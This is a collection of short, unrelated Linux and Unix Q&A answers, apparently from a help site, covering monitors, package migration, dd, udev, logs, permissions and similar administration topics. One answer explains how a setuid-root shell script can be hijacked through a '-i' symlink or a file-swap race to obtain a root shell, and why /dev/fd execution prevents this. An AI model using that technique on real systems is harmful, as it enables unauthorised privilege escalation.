what exactly are you trying to accomplish ? for managing monitor usage you can/should use the randr extension where xrandr would be the weapon of choice in scripts . xrandr -q shows all outputs of your computer and some info about connected monitors . to disable an output you would put something like xrandr --output=HDMI1 --off . in your case you have to replace " hdmi1" with whatever xrandr -q tells you your outputs are named . with your output disabled x does not use this monitor anymore ( at all ) and it will most likely enter a sleep state . if you actually want the monitor to turn off , your problem is that xset does neither know nor care about how many monitors you have hooked up to your computer , because xset talks to xservers , not their components and definetly not hardware . this means xset sends exactly one " dpms force off " request and that request is ( processed and ) sent to one of your monitors by the xserver . i would guess it sends it to your primary monitor , i.e. the one connected to the output that appears first in the list shown by xrandr -q . that is the same monitor your gnome panel lives on , if you are using gnome . in effect i would guess you have to issue your xset request twice . if that does not help immediately i would assume you need to be explicit about the issue which of your attached monitors is primary and which is not . xrandr allows you to set the primary output/monitor by the use of the --primary option . if your outputs are HDMI1 and HDMI2 , i would try : xrandr --output HDMI2 --primary xset dpms force off xrandr --output HDMI1 --primary xset dpms force off  check the output of xrandr -q and write a script that turns off your monitors in the reverse order they are listet , that is bottom up . the reason for that is , that while ( x ) randr is supposed to be able to arbitrarily make outputs the default output i would not/do not trust it to work that flawlessly , especially if there are closed source drivers involved . by working through your monitors in reverse order you turn off the " natural " primary monitor last and if things go wrong , having the " natural " primary monitor available is your best shot at having a fully functional xserver .
first , if you are going to keep running 32-bit binaries , you are not actually changing the processor architecture : you will still be running an x86 processor , even if it is also capable of doing other things . in that case , i recommend cloning your installation or simply moving the hard disk , as described in moving linux install to a new computer . on the other hand , if you want to have a 64-bit system ( in ubuntu terms : an amd64 architecture ) , you need to reinstall , because you can not install amd64 packages on an i386 system or vice versa . ( this will change when multiarch comes along ) . many customizations live in your home directory , and you can copy that to the new machine . the system settings can not be copied so easily because of the change in processor architecture . on ubuntu 10.10 and up , try oneconf . oneconf is a mechanism for recording software information in ubuntu one , and synchronizing with other computers as needed . in maverick , the list of installed software is stored . this may eventually expand to include some application settings and application state . other tools like stipple can provide more advanced settings/control . one of the main things you will want to reproduce on the new installation is the set of installed packages . on apt-based distributions , you can use the aptitude-create-state-bundle command ( part of the aptitude package ) to create an archive containing the list of installed packages and their debconf configuration , and aptitude-run-state-bundle on the new machine . ( thanks to intuited for telling me about aptitude-create-state-bundle . ) see also ubuntu list explicitly installed packages and the super user and ask ubuntu questions cited there , especially telemachus 's answer , on how to do this part manually . for things you have changed in /etc , you will need to review them . many have to do with the specific hardware or network settings and should not be copied . others have to do with personal preferences — but you should set personal preferences on a per-user basis whenever possible , so that the settings are saved in your home directory . if you plan in advance , you can use etckeeper to put /etc under version control ( etckeeper quickstart ) . you do not need to know anything about version control to use etckeeper , you only need to start learning if you want to take advantage of it to do fancy things .
on the links you posted about tracking /var/log/dmesg , it is only discussed on the first one , but i do not think this is really even the primary focus of these articles . they are primarily discussing how you had track changes made to your /etc directory , which is something you had definitely want to do , and it is pretty easy to do . however , if you are interested in tracking changes for /etc , i would use a wrapper tool such as etckeeper , instead of doing it with vanilla git/mercurial ( there are several reasons for this , the primary being that git and mercurial do not keep track of permissions that become important in /etc ) . obviously for /etc , all your configuration information is kept there so it is valuable to track changes on these files over time . as to whether you should track the changes made to /var/log/dmesg ? i do not see any value in this and believe it would be a waste of time and resources to do so .
true and false are coreutils ( also typically shell built-ins ) that just return 0 and non-0 , for situations where you happen to need that behavior . from the man pages : true - do nothing , successfully false - do nothing , unsuccessfully so you are piping the output from stop service foo into true , which ignores it and returns 0 . technically it works , but you should probably use || true so it is obvious what your intention was ; there is really no reason to pipe output into a program that is not using it
it does not highlight the selection , but otherwise i think it works fine . try running $ bind -p | grep copy-region-as-kill  to make sure that C-x C-r actually worked . it should say : "\ew": copy-region-as-kill  after that , it should work fine . example : $ abc&lt;C-Spc&gt;&lt;C-a&gt;&lt;M-w&gt; def &lt;C-y&gt;  gives me $ abc def abc  if you ever want to know where mark is , just do C-x C-x . example : $ &lt;C-Spc&gt;abc&lt;C-x&gt;&lt;C-x&gt;  will put the cursor back to where you set mark ( the start of the line ) . also , i do not think you need to add the set-mark binding . i did not . $ bind -p | grep set-mark "\C-@": set-mark "\e ": set-mark # vi-set-mark (not bound)  ( note that most terminals send C-@ when C-Spc is pressed . i assume yours does too . ) if all this fails : does ctrl + space work in emacs -nw on the same terminal ? do other alt / meta shortcuts work in bash ?
after seeing the dmseg and googling , the problem is solved : one has to add -sec=ntlm option . the problem ( feature ? ) is introduced in recent kernels ( i use 3.8.4 ) . i just did not realize , that the problem is kernel-related . so the correct way of mounting is : sudo mount -t cifs //netgear.local/public /media/mountY -o uid=1000,iocharset=utf8,username="adam",password="password",sec=ntlm 
make the replacement file /baz/bar . txt while the filesystem is not mounted . when /baz gets it is additional filesystem , this file will be below it and when the mounted filesystem has bar . txt , this will seem to replace the other file of below . . .
the ' x ' file : the run : version with line for " total " , sorting and skipping lines without difference : i added a line " yawns 3" to both input files . . . file1: yawns 3 viewer 23 test 27 remark 2  file2: viewer 2990 yawns 3 exam 200 remark 240  running : . . . and " yawns " does not show in the output . gawk can sort without external sort , but as long as possible , i prefer not to unse gawky features .
you have not accepted the other solutions , maybe because their output does not match the requested " london and germany " modern python can handle ip addresses out of the box : this prints the found locations and puts " and" between the last two locations found and " ," between all others ( when applicable ) : e.g. London, Paris and Germany the data is assumed to be in a file called input , make the script executable , or call with python scriptname 172.25.2.32
first of all if you are using virtualbox to host the xen server please ensure to use ethernet not wireless network and set promiscuous mode to " allow all " . secondly just to make everything clean , let 's start with clean installation of centos with xen and install the bridge network and centos vm on it . assuming you have external server 192.168.1.6 with centos iso extracted on /var/www/html/centos/6.3/os/i386/ and kickstart file on /var/www/html/centos/6.3/os/i386/ks . cfg and /var/www/html/centos/6.3/os/i386/repodata with correct names match names in repodata/trans . tbl file on the xen server ( centos+xen ) install the following packages : yum install -y rsync wget vim-enhanced openssh-clients yum install -y libvirt python-virtinst libvirt-daemon-xen yum install -y bridge-utils tunctl  then edit ifcfg-* file to create the bridge edit HWADDR=XX:XX:XX:XX:XX:XX line to match your mac address . do not reboot on ssh console , use vbox console reboot  after reboot , assuming you have dhcp server the xen server will got a new ip , login via vbox console to get the new ip ifconfig result should be similar to now the bridge is ready you can use the ip of br0 to get ssh console again to create a virtual machine on xen which use previous bridge : cd /var/lib/xen/images/  create virtual disk : dd if=/dev/zero of=centos_1.img bs=4K count=0 seek=1024K qemu-img create -f raw centos_1.img 8G  then use virt-install to create the vm : now the vm should start and be able to get ip from the dhcp server normally and able to complete unattended remote installation . the ifconfig result on xen should be similar to : after the installation complete you can use xen console to get the ip of it , then you can have ssh console on it .
if it is something that needs to happen at regularly scheduled intervals use cron ( e.g. you need to check the website once every hour , or once every day , or more or less frequently than that but still not arbitrarily defined ) . however . . . you may want to run a command at a cerain later time rather than right now , for that you want to use the at daemon , which allows you to run a command once at a later date/time ( like it is 5 o'clock and you want to go home but you have got a 4 hour process that would be best run in the middle of the night , and it is not reoccurring ) . i will say nohup , screen , tmux have been mentioned , use nohup if you want to run it right now but do not want to reconnnect to that session to check on it later . screen/tmux are for checking on it later .
gnome shell is just one part of gnome 3 . it ( together with mutter , the window managet ) , is its primary user interface . the secondary interface ( for hardware that can not handle the 3d workload , or for people who do not care about glitz ) , is gnome panel + metacity ( old window manager ) , which will basically give you the look of current gnome 2 . gnome ( 3 ) itself is a whole desktop suite that includes a whole bunch of stuff like a gui toolkit , development suites , a file manager , some utilities , some system-level daemons , and a whole bunch of apps .
at the system call level this should be possible . a program can open your target file for writing without truncating it and start writing what it reads from stdin . when reading eof , the output file can be truncated . since you are filtering lines from the input , the output file write position should always be less than the read position . this means you should not corrupt your input with the new output . however , finding a program that does this is the problem . dd(1) has the option conv=notrunc that does not truncate the output file on open , but it also does not truncate at the end , leaving the original file contents after the grep contents ( with a command like grep pattern bigfile | dd of=bigfile conv=notrunc ) since it is very simple from a system call perspective , i wrote a small program and tested it on a small ( 1mib ) full loopback filesystem . it did what you wanted , but you really want to test this with some other files first . it is always going to be risky overwriting a file . overwrite . c you would use it as : grep pattern bigfile | overwrite bigfile  i am mostly posting this for others to comment on before you try it . perhaps someone else knows of a program that does something similar that is more tested .
your question is not clear , you talk about a daemon in the title , but in the body only talk about a generic process . for a daemon there are specific means to stop it , for example in debian you have  service daemon-name stop  or  /etc/init.d/daemon-name stop  similar syntaxes exist for other initscript standards used in other distributions/os . to kill a non-daemon process , supposing it is in some way out of control , you can safely use killall or pkill , given that they use by default the SIGTERM ( 15 ) signal , and any decently written application should catch and gracefully exit on receiving this signal . take into account that these utilities could kill more that one process , if there are many with the same name . if that do not work , you can try SIGINT ( 2 ) , then SIGHUP ( 1 ) , and as a last resort SIGKILL ( 9 ) . this last signal cannot be catched by the application , so that it cannot perform any clean-up . for this reason it should be avoided every time you can . both pkill and killall accept a signal parameter in the form -NAME , as in pkill -INT process-name 
assuming your computer is usually stable , check for hardware problems , especially with the ram ( i.e. . install memtest86+ and choose memtest at the boot prompt ) , but also with disks ( disk errors sometimes crash the filesystem code ; install smartmontools and run smartctl -a /dev/sda ) . if the problem was gradual , you may find something in the kernel logs ( /var/log/kern.log ) , but often the crash happens too brutally for anything to be written to the logs .
not sure what changed , but the rule is now being used in the file /etc/udev/rules . d/81-pantech . rules one possibility is the missing /run/udev/rules . d/ directory . when i ran udevadm test /devices/platform/omap/musb-ti81xx/musb-hdrc.1/usb1/1-1  i got a line reporting that the directory was missing . i found this command through this guide : http://weininger.net/how-to-write-udev-rules-for-usb-devices/ mkdir /run/udev/rules.d/  another possibility is me manually running the udev daemon with /lib/udev/udevd --debug  this is my final rule :
as far as i can tell execi should work , not sure why it does not . in any case , i get conkyto show my public ip as follows : ${texeci 3600 wget -qO - http://cfajohnson.com/ipaddr.cgi}  try replacing execi with texeci , see if that helps . another possible problem is that conky may be loaded before your connection is established . if so , it will run your execi command on startup but it will get no result since you are not connected yet . i get around this type of problem by launching conky through a wrapper script that looks like this : #!/bin/bash sleep 20 conky 
to overwrite the start of the destination file without truncating it , give the notrunc conversion directive : $ dd if=out/one.img of=out/go.img conv=notrunc  if you wanted the source file 's data appended to the destination , you can do that with the seek directive : $ dd if=out/one.img of=out/go.img bs=1k seek=9  this tells dd that the block size is 1 kib , so that the seek goes forward by 9 kib before doing the write . you can also combine the two forms . for example , to overwrite the second 1 kib block in the file with a 1 kib source : $ dd if=out/one.img of=out/go.img bs=1k seek=9 conv=notrunc  that is , it skips the first 1 kib of the output file , overwrites data it finds there with data from the input file , then closes the output without truncating it first .
to pf or not to pf ? i do not believe pf is the appropriate place to filter a high level element such as ga.js . rather it operates a layer or two below that . filtering ga.js would be better suited to something such as a proxy package such as squid . excerpt from pf : packet filtering packet filtering is the selective passing or blocking of data packets as they pass through a network interface . the criteria that pf ( 4 ) uses when inspecting packets are based on the layer 3 ( ipv4 and ipv6 ) and layer 4 ( tcp , udp , icmp , and icmpv6 ) headers . the most often used criteria are source and destination address , source and destination port , and protocol . if you are familiar with the osi model and tcp/ip this diagram shows which layers pf would be working in and which layer your ga.js file would be accessible for filtering . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; so pf can operate at the transport and internet layers . to operate on something such as ga.js you had need to operate at the application layer , hence a proxy . squid setup this tutorial should get you started with the setup and configuration of squid , titled : web filtering on squid proxy .
you should put two arguments in quote or double quote : % ./ppa.sh -i 'ppa:chris-lea/node.js nodejs' received -i with ppa:chris-lea/node.js nodejs 
you could put the read and your case in a while loop and break out of it when the condition is satisfied : the while : ; do ... done represents an infinite loop . break exits a for , while , or until loop . use break to exit in case the answer is y or n , else the loop would continue .
i would attempt to take the source rpm ( srpm ) from fedora and simply rebuild that instead of trying to rebuild it from the source tarball file . i am not sure that the cups tarball comes with a usable . spec file for instructing rpmbuild on how to package it . example you can download the f21 version of the srpm here . $ wget http://dl.fedoraproject.org/pub/fedora/linux/development/rawhide/source/SRPMS/c/cups-1.7.0-6.fc21.src.rpm  then build it like so : $ rpmbuild --rebuild cups-1.7.0-6.fc21.src.rpm  if you have never built an rpm before you will likely want to install the rpmdevtools package which provides tools for facilitating package building . $ sudo yum install rpmdevtools  you can then use the included command to setup your own workspace for building packages . any user can build packages , so you generally should not ever do this using root . $ rpmdev-setuptree  once you have run this , you can run the rpmbuild --rebuild ... command i provided above which should produce a .rpm file in the appropriate directory under $HOME/rpmbuild/RPMS/ . if you need further help i would check out my extensive tutorials on the entire topic of dealing with rpms . there is a 4 part series on my blog . references centos rpm tutorial part 4 - another example of rolling your own . spec file
maybe you removed alsa related packages or you messed up their installation . since there are no snd_ * modules loaded , it is probable that /etc/modprobe.d/alsa-base.conf is wrong or missing . try reinstalling alsa and reboot : apt-get --reinstall install alsa-base alsa-oss alsa-utils gstreamer0.10-alsa  sometimes , upgrading a package , with many dependencies , to a major release version , a lot of those dependencies might be removed and replaced with alternative packages . when downgrading to the previous release , it is not certain that the dependency chain will return to it is original state . especially the upgraded configuration files . edit so , if you have upgraded from another repository than stable , like the experimental one , there is a way to downgrade all your packages to the stable release and hopefully fix all dependencies . create a file /etc/apt/preferences and add the following contents : Package: * Pin: release a=squeeze Pin-Priority: 1001  this is called pinning and it will give maximum priority to squeeze packages . ensure you have squeeze repositories in /etc/apt/sources.list and run apt-get update apt-get -d dist-upgrade apt-get dist-upgrade  this will downgrade every package to stable release . you have to be careful and watch the whole process , as all installation scripts are optimized for upgrading and not downgrading , this means that some packages may try to install in the wrong order . if that cause the downgrade to break , use dpkg --force-all -i /var/cache/apt/archives/&lt;pkgname&gt;.deb to force the installation of any required package , or apt-get -f install when needed and restart the dist-upgrade process . remove /etc/apt/preferences at the end .
according to fhs , /usr is the location where distribution-based items are placed and /usr/local is the location where you had place your own localized changes ( /usr/local will be empty after a base install ) . so , for example , if you wanted to recompile an ubuntu package from source , their package manager would place the source for package in /usr/src/{package dir} . if you downloaded a program not managed by your distribution and wanted to compile/install it , fhs dictates that you do that in /usr/local/src . edit : short answer , yes , put your code in /usr/local/src .
unless you have a particular reason , just use the packages provided by your distribution . that is , after all , the point of using a linux distribution . you get stability , some expectation of compatibility , and security updates — all with the convenience of yum update . if you are running an application that requires a particular version , or if your whole business revolves around your web application , you will know to make an exception . mysql and php , in particular , are notorious for having version-specific bugs or changes in behaviour . the mysql release notes are full of design decisions that were implemented in one micro-release , only to be reverted in a later release .
i do not see Perlx.x but the -&gt; just means the file is a symbolic link , the equivalent of a windows shortcut . the file BEA in the current directory is a symbolic link to ../../../Some/Folder/SOLARIS/BEA  the ../ means the parent directory , so if you are for example in /foo/bar/baz/dir  then the link would be for /foo/Some/Folder/SOLARIS/BEA  to illustrate :
i think you are confused about terminology . an " environment variable " is merely a shell variable that any child processes will inherit . what you are doing in your example is creating a shell variable . it is not in the environment until you export it : MY_HOME="/home/my_user" export MY_HOME  puts a variable named " my_home " in almost all shells ( csh , tcsh excepted ) . in this particular case , the double-quotes are superfluous . they have no effect . double-quotes group substrings , but allows whatever shell you use to do variable substitution . single-quoting groups substrings and prevents substitution . since your example assignment does not have any variables in it , the double-quotes could have appeared as single-quotes . nothing is in the environment until you export it .
emacs 24 uses the LOCAL parameter of add-hook instead of make-local-hook . ( i believe that was added in emacs 21.1 , but make-local-hook was not removed until emacs 24 . ) try this : (add-hook 'emacs-lisp-mode-hook '(lambda () (add-hook 'write-contents-hooks 'untab-all nil t) ))  your other problem is that untab-all must return nil to indicate that it did not write the buffer to disk ( as explained in the docs for write-contents-hooks , or as it is now called , write-contents-functions ) :
there was a bit of discussion about that topic in an old bug report on exactly that limit : they used to reside in different ( smaller ) disks ( and may go back ) . several partitions give me more flexibility to move them around using labels . i was not using ext3 before , so smaller partitions made shorter fscks in the case of power-downs . i am too lazy to use quotas to limit dept . disk usage but even then the short answer was : anyone who needs even 16 partitions is insane, : . nowadays we have lvm and those limits do not matter anymore . : )
i do not know the exact answer to your question . but this may help . i am using fedora and not mint however i still believe this should work . there are different shortcut keys assigned for a particular type of command execution . you can find them in your System -&gt; Preferences -&gt; [System] -&gt;Keyboard Shortcuts. you will also see various different kind of keys ( symbols ) used in there like XF86Mute for audio mute , XF86Calculator for calculator . these i think are related to the special keys which comes in your pc/laptop . if you are not able to determine the one for opening the home folder or the search button just change it in there like i changed search for "Windows Key + S" and for home dir i made it " windows key + h " .
to track the packages that are installed , updated and removed on an ubuntu system , there is the /var/log/dpkg.log file which list all the operations done . to track the version of the kernel used at boot time , you can see this with the last command . an exemple of output of last : you see the version of the kernel used to boot in the third column . as last takes its information from the /var/log/wtmp file which may be rotated ( like any other log files ) , you can retrieve older information by using the command like this : $ last -f /var/log/wtmp.1  to display the information contained in /var/log/wtmp.1 . of course , the process logrotate can be adapted to retain more archives of log files . see /etc/logrotate.conf and the files under /etc/logrotate.d directory to increase the number of archived log files to keep .
i am not sure what exactly happened . what happened was that the file was rotated by an external application . this is usual . utilities like logrotate rotate log files , i.e. the contents of the existing log file are moved to another file and the existing one is blanked out before an application starts writing to it again . when tail determines that the size of the tracked file has reduced , then it prints the message you observed and continues tracking the file . quoting from tail invocation section of gnu coreutils manual : no matter which method you use , if the tracked file is determined to have shrunk , tail prints a message saying the file has been truncated and resumes tracking the end of the file from the newly-determined endpoint .
one approach could be to compute the levenshtein distance . here using the Text::LevenshteinXS perl module : distance() { perl -MText::LevenshteinXS -le 'print distance(@ARGV)' "$@" }  then : $ distance foo foo 0 $ distance black blink 2 $ distance "$(cat /etc/passwd)" "$(tr a b &lt; /etc/passwd)" 177  here 's a line-based implementation of the levenshtein distance in awk ( computes the distance in terms of number of inserted/deleted/modified lines instead of characters ) : you may also be interested in diffstat 's output :
you do not need patch for this ; it is for extracting changes and sending them on without the unchanged part of the file . the tool for merging two versions of a file is merge , but as @vonbrand wrote , you need the " base " file from which your two versions diverged . to do a merge without it , use diff like this : diff -DVERSION1 file1.xml file2.xml &gt; merged.xml  it will enclose each set of changes in c-style #ifdef/#ifndef , like this : #ifdef VERSION1 &lt;stuff added to file1.xml&gt; #endif ... #ifndef VERSION1 &lt;stuff added to file2.xml&gt; #endif  if a line or region differs between the two files , you will get a " conflict " , which looks like this : #ifndef VERSION1 &lt;version 1&gt; #else /* VERSION1 */ &lt;version 2&gt; #endif /* VERSION1 */  so save the output in a file , and open it in an editor . search for any places where #else comes up , and resolve them manually . then save the file and run it through grep -v to get rid of the remaining #if and #end tags : grep -v '^#if' merged.xml | grep -v '^#endif' &gt; clean.xml  in the future , save the original version of the file . merge can give you much better results with the help of the extra information . ( but be careful : merge edits one of the files in-place , unless you use -p . read the manual ) .
you can make an lvm mirror volume . as the name suggests , a mirror volume has exactly the same contents in two ( or more ) places . use lvcreate -m 1 to create a two-sided logical volume . each side of the mirror must be on different physical volumes within the same volume group . you can do the the mirroring with the device mapper layer . create two storage volumes ( disk partitions , in your case ) , and create a raid-1 volume from them ( mdadm -C -l 1 ) . neither solution is very useful , as the most common failure mode for a hard disk is for it to become completely unusable . even if it does not fail outright , once a few sectors become unreadable , others usually quickly follow . and mirroring is useless about software problems such as accidentally erasing a file . mirroring between two disks is useful to keep going when one of the disk fails , but does not replace backups . in your case , back up to an external usb drive or key .
unfortunately , i am unable to give a complete answer . all i have is advice about some possible paths to wander down . the easiest route would be if the emacs-g-client that gilles mentioned in the su version of this question works . if that does not work , i would look into the following : at the very least you should be able to get some calendar functionality by accessing your google calendar using ical . the function icalendar-import-file can import an ical file to a emacs diary file ( icalendar-import-file documentation ) . thus , in your . emacs file you could have a bit of emacs lisp to get the google calendar ical file and import it into your diary . if you do end up using org-mode there are a number of ways to integrate org-mode with diary-mode . i think that the ultimate goal would be to make use of the gdata api . i do not think that there is an easy way to get access to google contacts outside of this api . there is a command line utility that supports a wide range of functionality using this api called google cl , which could theoretically be used inside some emacs lisp functions to provide full access to your contacts , calendar , and many other google-hosted services . this however , would likely be much more difficult than just a few lines thrown into your . emacs .
solved ! simple as that : /root/.bashrc had this inside :  export GREP_OPTIONS='--color=always'  changed it to :  export GREP_OPTIONS='--color=never'  . . . and restarted the root shell ( of course ; do not omit this step ) . everything started working again . both nvidia and virtualbox kernel modules built from the first try . i am so happy ! :- ) then again though , i am slighly disappointed by the kernel build tools . they should know better and pass --color=never everywhere they use grep ; or rather , store the old value of GREP_OPTIONS , override it for the lifetime of the building process , then restore it . i am hopeful that my epic one-week battle with this problem will prove valuable both to the community and the kernel build tools developers . a very warm thanks to the people who were with me and tried to help . ( all credits go here : http://forums.gentoo.org/viewtopic-p-4156366.html#4156366 )
you have copy and pasted a lot of unnecessary transcripts but your first paragraph pretty much says it all : when i run sudo gparted on a live ubuntu usb , i get input/output error during read on /dev/sdc . so you have a defective disk . the error comes directly on /dev/sdc ( not /dev/sdc1 or /dev/sda2 , etc . . . ) so it applies to the whole disk . therefore the partition table has nothing to do with it . you should look at the output of dmesg or the contents of /var/log/kern.log to get additional information about the i/o error . if it is a defective sector then this will tell you which sector it is . doing a bad blocks scan with badblocks -w /dev/sdc might give you interesting output . it might also force the hard drive 's onboard firmware to reallocate bad sectors from its spare sector pool so that you can continue using the drive .
your ps command should work if you sort it properly . from man ps: i am not sure which time you want to sort by but here are the relevant choices : i think from your question that you want cputime . if so , this should give you your desired output : ps -eo pid,user,args,etime,time,%cpu --sort cputime | grep -v root 
i have run into a similar problem , and the only solution i have found is to go into the pip build dir ( /tmp/pip-{random hash} , can usually be found in the tail end of the error , may also be /usr/tmp/ , or named pysqlite , depends on your setup ) and alter the pysqlite setup . cfg . when downloaded it looks like this : [build_ext] #define= #include_dirs=/usr/local/include #library_dirs=/usr/local/lib libraries=sqlite3 define=SQLITE_OMIT_LOAD_EXTENSION  when i uncomment the include_dirs and library_dirs , pysqlite will install fine . the downside of this , is that i have yet to find a way to easily automate this step , so it needs to be done with every virtualenv set up . it is ugly , unpleasant , and a pain in the ass , but it does let pysqlite be installed . hope this helps . ps if you are trying to run the pip install in a virtualenv , the downloaded files are likely to be found in {virtualenv}/build/pysqlite .
what does it mean ? what is " exit 2" ? it is exit status of ls . see man for ls : i guess the reason is that you have lots of *conf files in /etc and no *conf files in /usr . in fact ls -ld /usr/*conf; would have had the same effect . so if i do on my computer ls for an existing file : ls main.cpp; echo $? main.cpp 0  and for a file that does not exists : ls main.cppp; echo $? ls: cannot access main.cppp: No such file or directory 2  or as a background process ls for a a file that does not exists : &gt;ls main.cppp &amp; [1] 26880 ls: cannot access main.cppp: No such file or directory [1]+ Exit 2 ls main.cppp 
i can not see how that can apply to sudo . for the setuid scripts , the idea is this : assume you have a /usr/local/bin/myscript that is setuid root and starts with #! /bin/sh . nobody has write access to /usr/local/bin or myscript , but anybody can do : ln -s /usr/local/bin/myscript /tmp/-i  and /tmp/-i also becomes a setuid script , and even though you still will not have write access to it , you do have write access to /tmp . on systems where setuid scripts are not executed by means of /dev/fd , when you execute cd /tmp &amp;&amp; -i , the setuid bit means it will run : /bin/sh -i as root : the process changes euid to the file owner the system parses the shebang the system executes ( still as root ) , /bin/sh -i now , for that particular case , the easy work around is to write the shebang the recommended way : #! /bin/sh - , but even then , there is a race condition . now it becomes : the process changes euid to the file owner the system parses the shebang the system executes ( still as root ) , /bin/sh - -i " sh " opens the "-i " file in the current directory ( fine you would think ) . but between 3 and 4 above , you have plenty of time to change "-i " or ( "any-file " , as it is a different attack vector here ) to some evil "-i " file that contains for instance just " sh " and you get a root shell ( for a setuid root script ) . with older versions of ksh , you did not even need to do that because in 4 , ksh first looked for "-i " in $PATH , so it was enough to put your evil "-i " in $PATH ( ksh would open that one instead of the one in /tmp ) . all those attack vectors are fixed if when you do : cd /tmp; -i , the system does instead ( still in the execve system call ) : atomically : find out the file is setuid and open the file on some file descriptor x of the process . process euid changes to the file owner . run /bin/sh /dev/fd/x sh opens /dev/fd/x which can only refer to the file that was execved . the point is that the file is opened as part of the execve so we know it is the code with the trusted content that is going to be interpreted with changed priviledges . now that does not apply to sudo because the sudo policy is based on path . if the sudo rule says you can run /usr/local/bin/myscript as root , then you can do : sudo /usr/local/bin/myscript  but you can not do : sudo /tmp/any-file  even if " any-file " is a hardlink or symlink to /usr/local/bin/myscript . sudo does not make use of /dev/fd afaict .
open("/dev/tty", O_RDWR) = 4 
as long as you do not want to search for some special characters ( like &amp; ) , one of the most easy way to start a search is to put the following function googleit() { xdg-open "http://google.com/search?q=$*" }  into your $HOME/.bashrc . after re-login or restarting the shell or sourcing this file , you can then simply type $ googleit The phrase I want to search for  and your default browser should start with the corresponding search result .
bash does not completely re-interpret the command line after expanding variables . to force this , put eval in front : r="directory1/directory2/direcotry3/file.dat | less -I " eval "cat path1/path2/$r"  nevertheless , there are more elegant ways to do this ( aliases , functions etc . ) .
i usually use the little utility beep installed on many systems . this command will try different aproaches to create a system sound . 3 ways of creating a sound from the beep manpage : the traditional method of producing a beep in a shell script is to write an ascii bel ( \007 ) character to standard output , by means of a shell command such as ‘echo -ne '\007'’ . this only works if the calling shell 's standard output is currently directed to a terminal device of some sort ; if not , the beep will produce no sound and might even cause unwanted corruption in whatever file the output is directed to . there are other ways to cause a beeping noise . a slightly more reliable method is to open /dev/tty and send your bel character there . this is robust against i/o redirection , but still fails in the case where the shell script wishing to generate a beep does not have a controlling terminal , for example because it is run from an x window manager . a third approach is to connect to your x display and send it a bell command . this does not depend on a unix terminal device , but does ( of course ) require an x display . beep will simply try these 3 methods .
highly recommend ubuntu server . the server mode will not put much that you do not really need , if anything . i run ubuntu on several servers and have always been happy with it . you will also find tons of online support that is relevant to your distro . linux advice generally translates from one distro to the next , but directory paths are often different . ubuntu has a huge user base , which generally means an easier time figuring out what is wrong .
mv folder to .newfolder - .mvfolder , the dot in front hides the files . try ls -la - its on the same level as your folder , probably .
sudo is a a normal application with the suid bit . this means in order to use sudo it has to be installed on the system . not all linux systems have sudo installed per default like for example debian . most android systems are targeted for end users who do not need to know the internals of android ( i.e. . each android applications runs under it is own user ) , so there is no need to provide an interactive way for an enduser to run a command as system administrator . in general you can use su instead of sudo to run a command as a different user but you have to know the credentials for the target user for su ( for sudo you have to know the credentials of the user running the command )
grep if you are only interested in the names of the files that contain a search string 1 time you can use grep with its -l switch to do this . example say i have 2 files full of numbers . $ seq 100 &gt; sample1.txt $ seq 100 &gt; sample2.txt  now if i search that file for occurrences of the string "10" . $ grep -l 10 sample*.txt sample1.txt sample2.txt  it will only return the files that contain a match 1 time , even if there are multiple lines that match . as proof , if i take the -l switch out : $ grep 10 sample*.txt sample1.txt:10 sample1.txt:100 sample2.txt:10 sample2.txt:100  pcregrep if you want to search for patterns across multiple lines you can use pcregrep along with its -M switch , for multi-line . $ pcregrep -M "11[\\n,]*.*12" sample* sample1.txt:11 12 sample2.txt:11 12 
it looks like you do not have the proxy information configured in your repo file . according to http://www.centos.org/docs/5/html/yum/sn-yum-proxy-server.html , you have to specify your proxy , proxy_username , and proxy_password in yum.conf . this doc is for centos 5 , but it should hold for centos 6 as well .
i wrote bedup for this purpose . it combines incremental btree scanning with cow-deduplication . best used with linux 3.6 , where you can run : sudo bedup dedup 
i believe the solution is to modify the local policykit definitions . create a file called , say , /etc/polkit-1/localauthority/50-local . d/allowuserupdate . pkla [Allow User Updates] Identity=* Action=org.freedesktop.packagekit.system-update ResultAny=no ResultInactive=no ResultActive=yes  if you only want your user , you could change Identity=YOURUSERNAME ( replace YOURUSERID with your username ) .
libcurl does not support the rsync protocol . from the libcurl faq : section 3.21 libcurl does not know the rsync protocol at all , not even a hint . but , since it was designed to ' guess ' the protocol from the designator in a url , trying to use rsync://blah.blah will give you the error you see , since it guesses you meant ' rsync ' , but it does not know that one , so it returns the error . it'll give you the same error if you tried lornix://blah.blah , i doubt i am a file transfer protocol either . ( if i am , please let me know ! ) libcurl does support an impressive set of protocols , but rsync is not one of them .
you could create a file ~/path/to/myquery . sql : select name, reported_at from nodes where reported_at &lt; curdate() -7;  and to edit your crontab execute crontab -e  and in your crontab add a line * * * * * mysql dashboard &lt; ~/path/to/myquery.sql &gt; ~/path/to/query/output  to edit how often this command is run , you have to edit the five * 's at the start of that line . to understand how to do this properly , you can check out this page .
the puppet daemon will automatically notice changes to the puppet . conf file without needing to be restarted . simply remove the subscribe =&gt; File["/etc/puppet/puppet.conf"] from service { "puppet" ... } and everything will still work . puppet can not really ensure =&gt; running for itself , either . using something like the mutal restart with puppet ensuring cron is running and a cronjob ensuring puppet is running will work , however .
the tool you are looking for is called exiftool . you can use it to read and write exif meta data that is attached to a single image or a whole directories worth of files using its recursive switch ( -r ) . to change the camera model you can use the -model=".." switch . example here 's an image before the change . to change the model of my camera . $ exiftool -model="sam's camera"  ff42403138dd5fa56e38efdaab2ced1435d0e28c.jpg now when we recheck the tags . there is another tool called exiv2 which does the same kinds of things as exiftool in case you are interested . references exiv2 website exiftool website
msql.so is not the php extension for mysql . try enabling the correct module ( php_mysql ) and trying again .
the file beam-server.jpr is a symbolic link to .ade_path/beam-server.jpr . this is also what the l stands for in the file 's permissions . file and directory names prefixed with a full stop ( . ) are hidden and not normally listed by ls unless the -a or --all arguments are passed .
